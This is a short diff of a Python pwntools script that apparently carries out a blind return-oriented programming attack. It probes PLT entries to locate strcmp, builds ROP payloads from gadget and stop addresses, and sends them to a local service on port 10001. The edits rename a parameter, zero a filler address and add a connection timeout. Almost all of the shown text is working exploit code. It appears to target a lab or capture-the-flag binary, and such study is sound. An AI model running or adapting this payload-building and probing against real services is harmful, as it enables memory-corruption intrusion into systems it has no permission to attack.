@@ -1,6 +1,6 @@
 from pwn import *
 
-def get_strcmp(size = 72, plt_addr = 0x400570, num_entries = 10, brop_addr = 0x40078a, stop_gadget = 0x400545):
+def get_strcmp(size = 72, plt_addr = 0x400570, num_entries = 10, brop_addr = 0x40078a, stop_addr = 0x400545):
     
     # start before for false negative
     start_addr = plt_addr - 0x30
@@ -31,10 +31,10 @@ def call(probe, size, brop_addr, stop_addr, arg1, arg2):
     payload += p64(arg2)
     payload += p64(probe)
     payload += p64(stop_addr)
-    payload += p64(bad)
+    payload += p64(0x000000)
     
     try:
-        p = remote('127.0.0.1', 10001)
+        p = remote('127.0.0.1', 10001, timeout = 2)
         p.recvline()
         p.sendline(payload)
         p.recvline()
